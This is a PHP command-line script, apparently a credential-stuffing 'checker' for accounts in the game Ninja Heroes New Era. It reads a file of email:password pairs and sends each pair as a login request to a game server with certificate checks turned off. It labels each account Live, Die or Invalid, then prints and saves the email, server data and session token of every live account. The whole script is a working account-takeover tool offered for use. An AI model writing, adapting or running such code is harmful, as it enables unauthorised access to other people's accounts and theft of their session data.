<?php
echo "
 _____  _            ___  _         
|  __ \(_)          / _ \| |        
| |__) |_  ___ _ __| | | | |_ ____  
|  _  /| |/ __| '__| | | | __|_  /  
| | \ \| | (__| |  | |_| | |_ / / _ 
|_|  \_\_|\___|_|   \___/ \__/___(_) 
Ninja Heroes New Era Checker\n\n";
error_reporting(0);
echo "Input List : ";
$list = trim(fgets(STDIN));

$empas = preg_split(
    '/\n|\r\n?/',
    trim(file_get_contents($list))
);

for ($i = 0; $i < count($empas); $i++) {
    $parse = explode(":", $empas[$i]);
    $email = $parse[0];
    $pass = $parse[1];
    # code...
    $url = "http://central.kageherostudio.com/game/lyto/login?accId=" . $email . "&pwd=" . $pass . "&channel=99108&lv=1";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);

    $headers = array(
        "Accept: application/json",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    //for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    curl_close($curl);
    //var_dump($resp);

    $json_data = json_decode($resp);
    if ($json_data->code == '1') {
        echo "Live ";
        $hapus = str_replace('{"code":1,"msg":"','',$resp);
            $hasil = str_replace('"}"}','"}',$hapus);
            $ngentot = str_replace('\\','',$hasil);
            $result = array_values(json_decode($ngentot, true));
        
            echo "-> Email : ";
            print_r($result['0']);
            echo " | Server : ";
            print_r($result['2']['1']);
            print_r($result['2']['0']);
            print_r($result['2']['2']);
            print_r($result['2']['3']);
            echo " | sgin : ";
            print_r($result['3']);
            echo "\n";

            file_put_contents("test.txt", $ngentot);

    } elseif ($json_data->code == '-1') {
        echo "Die ";
        echo "-> $email \n";
    } elseif ($json_data->code == '-2') {
        echo "Invalid ";
        echo "-> $email \n";
    }


    //echo "-> $email \n";

}
